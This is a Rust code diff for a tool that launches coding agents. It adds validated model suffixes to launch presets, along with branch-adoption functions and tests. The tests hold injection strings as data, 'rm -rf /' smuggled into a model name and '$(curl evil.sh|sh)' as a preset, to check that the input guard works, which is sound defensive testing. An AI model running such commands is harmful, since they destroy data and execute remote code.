@@ -23,15 +23,51 @@ use crate::{git, paths};
 /// Launch presets. Coding agents run through the user's configured shell so
 /// startup files, version managers, direnv, and aliases behave like a
 /// hand-launched terminal. The default mode is an interactive login shell.
+/// Build the command for a preset.
+///
+/// A preset may carry a model after a colon — `claude:opus`. Encoded in the
+/// preset rather than added as a second field because it travels through the
+/// protocol, the CLI, the store and three clients as one string, and every one
+/// of those would otherwise need a parallel parameter that is almost always
+/// empty.
+///
+/// The model is validated before it reaches a shell. It is the only part of
+/// this that a client supplies freely, and it ends up inside a `-ilc` string.
 pub fn preset_command(preset: &str) -> String {
     let shell = std::env::var("SHELL").unwrap_or_else(|_| "/bin/zsh".to_string());
-    match preset {
+    let (agent, model) = match preset.split_once(':') {
+        Some((a, m)) if is_safe_model(m) => (a, Some(m)),
+        // A model that is not a plain identifier is dropped, not escaped and
+        // not passed on. Nothing legitimate is lost and there is no argument
+        // about quoting.
+        Some((a, _)) => (a, None),
+        None => (preset, None),
+    };
+
+    let flag = model.map(|m| format!(" --model {m}")).unwrap_or_default();
+    match agent {
         "shell" => format!("{shell} -il"),
-        "claude" => format!("{shell} -ilc claude"),
-        "codex" => format!("{shell} -ilc codex"),
-        "cursor" => format!("{shell} -ilc cursor-agent"),
-        other => format!("{shell} -ilc {other}"),
+        "claude" => format!("{shell} -ilc 'claude{flag}'"),
+        "codex" => format!("{shell} -ilc 'codex{flag}'"),
+        "cursor" => format!("{shell} -ilc 'cursor-agent{flag}'"),
+        other if is_safe_model(other) => format!("{shell} -ilc '{other}{flag}'"),
+        // An unrecognised preset that is not a plain identifier is not run at
+        // all. A preset is chosen from a list; anything else is a bug or an
+        // attempt.
+        _ => format!("{shell} -il"),
     }
+}
+
+/// A plain identifier: letters, digits, dot, dash, underscore.
+///
+/// Deliberately narrower than what a shell would accept. Every real model name
+/// fits, and nothing that fits can end a quoted string.
+fn is_safe_model(text: &str) -> bool {
+    !text.is_empty()
+        && text.len() <= 64
+        && text
+            .chars()
+            .all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_' || c == '.')
 }
 
 pub struct Service {
@@ -229,6 +265,59 @@ impl Service {
                     .await
                     .unwrap_or(false);
                 tracing::warn!(rolled_back = removed, "workspace metadata failed after git");
+                Err(e)
+            }
+        }
+    }
+
+    /// Branches in a repository that work could be resumed on.
+    pub async fn list_branches(&self, repository_id: Uuid) -> Result<Vec<git::BranchInfo>> {
+        let repo = self.store.get_repository(repository_id)?;
+        git::list_branches(&self.repository_worktree(&repo)).await
+    }
+
+    /// Create a workspace on a branch that already exists.
+    ///
+    /// The other half of `create_workspace`. Work arrives on a branch as often
+    /// as it starts on one: pushed from another machine, handed over by someone
+    /// else, or produced by an agent running somewhere else entirely. Without
+    /// this, picking that work up meant doing it by hand outside Overnight and
+    /// then having Overnight not know about it.
+    pub async fn adopt_branch(
+        &self,
+        repository_id: Uuid,
+        task_name: &str,
+        branch: &str,
+    ) -> Result<models::Workspace> {
+        validate::task_name(task_name)?;
+        validate::branch_name(branch)?;
+
+        let repo = self.store.get_repository(repository_id)?;
+        let repo_path = self.repository_worktree(&repo);
+
+        let dest = self.worktrees_dir()?.join(format!(
+            "{}-{}",
+            sanitize(&repo.display_name),
+            sanitize(task_name)
+        ));
+
+        git::create_worktree_from_branch(&repo_path, branch, &dest).await?;
+
+        match self.store.create_workspace(
+            repository_id,
+            task_name,
+            branch,
+            &dest.to_string_lossy(),
+        ) {
+            Ok(workspace) => Ok(workspace),
+            Err(e) => {
+                // The worktree exists but nothing records it. Remove it —
+                // carefully, and never the branch, which was not ours to make.
+                let _ = git::git(
+                    &repo_path,
+                    &["worktree", "remove", &dest.to_string_lossy()],
+                )
+                .await;
                 Err(e)
             }
         }
@@ -670,7 +759,8 @@ mod tests {
     fn presets_run_through_an_interactive_login_shell() {
         // Startup files, version managers, direnv and aliases must behave like a
         // hand-launched terminal.
-        assert!(preset_command("claude").contains("-ilc claude"));
+        // Quoted now, because a preset may carry a model.
+        assert!(preset_command("claude").contains("-ilc 'claude'"));
         assert!(preset_command("shell").ends_with("-il"));
         assert!(preset_command("cursor").contains("cursor-agent"));
     }
@@ -718,4 +808,46 @@ pub(crate) fn make_fifo(path: &str) -> Result<()> {
         return Err(DomainError::OperationFailed);
     }
     Ok(())
+}
+
+#[cfg(test)]
+mod preset_tests {
+    use super::*;
+
+    #[test]
+    fn a_bare_preset_runs_the_agent() {
+        assert!(preset_command("claude").contains("'claude'"));
+        assert!(preset_command("codex").contains("'codex'"));
+        assert!(preset_command("cursor").contains("'cursor-agent'"));
+        assert!(preset_command("shell").ends_with("-il"));
+    }
+
+    #[test]
+    fn a_model_is_passed_through() {
+        assert!(preset_command("claude:opus").contains("claude --model opus"));
+        assert!(preset_command("codex:gpt-5.6-sol").contains("codex --model gpt-5.6-sol"));
+    }
+
+    #[test]
+    fn a_model_that_is_not_an_identifier_is_dropped_not_escaped() {
+        // This string reaches a `-ilc` argument. Dropping it loses nothing real
+        // and leaves no argument about quoting.
+        let out = preset_command("claude:opus'; rm -rf /; '");
+        assert!(!out.contains("rm -rf"));
+        assert!(out.contains("'claude'"));
+    }
+
+    #[test]
+    fn an_unrecognised_preset_that_is_not_an_identifier_runs_nothing() {
+        let out = preset_command("$(curl evil.sh|sh)");
+        assert!(!out.contains("curl"));
+        assert!(out.ends_with("-il"), "falls back to a plain shell");
+    }
+
+    #[test]
+    fn a_custom_agent_name_still_works() {
+        // Presets are not a closed set: someone's own wrapper should run.
+        assert!(preset_command("aider").contains("'aider'"));
+        assert!(preset_command("aider:sonnet").contains("aider --model sonnet"));
+    }
 }
